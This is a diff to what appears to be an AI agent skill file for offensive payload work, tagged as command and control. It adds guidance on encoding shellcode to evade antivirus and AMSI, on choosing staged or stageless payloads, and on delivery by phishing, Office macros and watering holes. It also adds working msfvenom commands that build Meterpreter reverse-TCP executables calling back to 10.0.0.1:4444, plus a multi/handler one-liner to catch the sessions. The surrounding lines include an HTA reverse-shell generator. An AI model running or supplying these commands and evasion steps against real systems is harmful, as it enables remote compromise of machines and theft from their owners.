@@ -18,7 +18,7 @@ allowed-tools:
 metadata:
   domain: exploitation
   tool_count: 7
-  guide_count: 3
+  guide_count: 5
   mitre: "TA0007-Command and Control"
 ---
 
@@ -222,6 +222,79 @@ msfconsole -x "use exploit/multi/script/web_delivery; set TARGET 7; set PAYLOAD 
 # HTA delivery (Internet Explorer / mshta.exe)
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f hta-psh -o evil.hta
 ```
+
+## Payload Encoding Strategies
+
+Encoding transforms shellcode bytes to avoid specific byte sequences (bad characters), bypass signature-based detection, and adapt payloads for restrictive delivery channels. Understanding when and how to apply encoding is critical for successful payload delivery.
+
+### Encoding Decision Matrix
+
+| Scenario | Recommended Approach | Rationale |
+|----------|---------------------|-----------|
+| Known bad characters (exploit dev) | `-b '\x00\x0a\x0d'` with msfvenom | Removes specific bytes that break exploitation |
+| Basic AV bypass | shikata_ga_nai x3-5 iterations | Polymorphic output varies each generation |
+| Advanced AV bypass | Shellter PE injection | Injects into legitimate executable at assembly level |
+| Network signature evasion | Multi-encoder chain (3+ encoders) | Multiple transformations defeat single-pattern signatures |
+| PowerShell AMSI bypass | Custom AMSI bypass + encoding | AMSI intercepts decoded content at runtime |
+| Memory-only execution | Web delivery + hoaxshell HTTPS | No file artifacts for signature scanning |
+
+### Encoding Trade-offs
+
+Higher encoding iteration counts increase payload size and may trigger behavioral heuristics that flag polymorphic code patterns. A 5-iteration shikata_ga_nai encoding produces a larger payload than a single iteration, and the decoder stub itself can become a detection signature. Multi-encoder chains (applying different encoding algorithms sequentially) are more effective than high iterations of a single encoder because each encoder produces a different transformation pattern.
+
+## Staged vs Stageless Payload Selection
+
+Choosing between staged and stageless payloads is one of the most consequential decisions in payload generation. The wrong choice results in silent failures that are difficult to diagnose during engagements.
+
+### Selection Criteria
+
+| Condition | Choose Staged | Choose Stageless |
+|-----------|--------------|------------------|
+| Strict egress filtering | No | Yes (no second download needed) |
+| Network proxy inspection | No | Yes (single connection) |
+| Need for meterpreter features | Yes | Yes |
+| Target has limited bandwidth | Yes (smaller initial download) | No |
+| Listener flexibility needed | No (requires multi/handler) | Yes (any TCP listener) |
+| Maximum stealth needed | Yes (smaller signature surface) | No (full payload visible) |
+| Unreliable network conditions | No | Yes (self-contained) |
+| Need for AV evasion | Yes (less code to detect) | No (more code to analyze) |
+
+### Hybrid Approach
+
+For engagements where both reliability and stealth are needed, generate both staged and stageless payloads targeting the same LHOST/LPORT. Deploy the staged payload as the primary vector (smaller, less detectable) and fall back to the stageless payload if the second stage download fails due to network restrictions.
+
+```bash
+# Generate both variants with matching parameters
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o staged.exe
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o stageless.exe
+
+# Set up multi/handler that can catch both
+msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.0.0.1; set LPORT 4444; set ExitOnSession false; exploit -j"
+```
+
+## Payload Delivery Methods
+
+The delivery method determines how the payload reaches the target system. Selecting the right delivery method requires understanding the target environment, the available attack vectors, and the defensive controls in place.
+
+### Delivery Method Comparison
+
+| Method | Target Interaction | Stealth | AV Evasion | Prerequisites |
+|--------|-------------------|---------|------------|---------------|
+| HTTP download (curl/wget) | Low (command execution) | Low | Low | Web access, command execution |
+| PowerShell web delivery | Low (one-liner) | Medium | Medium | PowerShell available |
+| HTA (mshta.exe) | Medium (user opens link) | Medium | Medium | User interaction, mshta available |
+| Office macro | High (user opens document) | Medium | Medium | Macros enabled, Office installed |
+| DLL side-loading | Low (application start) | High | High | Target application identified |
+| Physical media (USB) | High (physical insertion) | High | High | Physical access |
+| Phishing email | High (user opens attachment) | Medium | Medium | Email infrastructure |
+| Watering hole | High (user visits site) | High | High | Compromised web server |
+
+### Delivery Reliability Best Practices
+
+1. Always test the delivery chain end-to-end before the engagement. A payload that works in the lab but fails on the target wastes time and may alert defenders.
+2. Have multiple delivery methods prepared. If the primary method is blocked, immediately switch to the backup without re-generating payloads.
+3. Match the delivery method to the target's daily workflow. A malicious macro in a financial spreadsheet is more convincing than a generic HTA download.
+4. Consider the forensic artifacts each method leaves. HTA files create temporary files on disk. PowerShell web delivery may be logged in event logs. Memory-only delivery (hoaxshell) leaves fewer artifacts.
 
 ## Automation and Scripting
 
